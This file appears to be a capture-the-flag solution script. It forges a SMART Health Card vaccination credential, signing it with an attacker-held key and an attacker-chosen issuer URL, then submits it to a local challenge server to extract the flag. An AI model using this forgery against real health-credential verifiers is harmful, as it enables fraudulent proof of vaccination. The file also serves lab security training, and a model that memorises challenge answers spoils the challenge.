import axios from 'axios';
import qs from 'qs';
import fs from 'fs';
import path from 'path';
import { Solution } from "../utils";
import { SHC } from '../../src/shc';
import { JWK } from '../../src/jws';

const ENV = JSON.parse(fs.readFileSync(path.resolve(__dirname, "./.env.json")).toString("utf8"));
const KEY_D = ENV.d;
const JWKS_URL = ENV.url;
const KEY_KID = ENV.kid;

const URL = "http://localhost:1337/samples/4";

export class Solve extends Solution {
    public async solve() {
        let jwk = new JWK({
            alg: "ES256",
            crv: "P-256",
            d: KEY_D,
            kty: "EC",
            kid: KEY_KID,
            use: "sig"
        });

        let shc = new SHC(
            {
                "alg": "ES256",
                "kid": jwk.kid,
                "zip": "DEF"
            }, 
            {
                "iss": JWKS_URL,
                "name": {
                    "given": "John",
                    "family": "Doe"
                },
                "vaccinated": true
            }
        );

        shc.sign(jwk);

        let data = (await axios.post(URL, qs.stringify({
            shc: shc.toString()
        }))).data;

        let regex = /CTF{.*?}/.exec(data);

        if(regex) {
            console.log(regex[0]);
        } else {
            console.log("FAIL:", data);
        }
    }
}
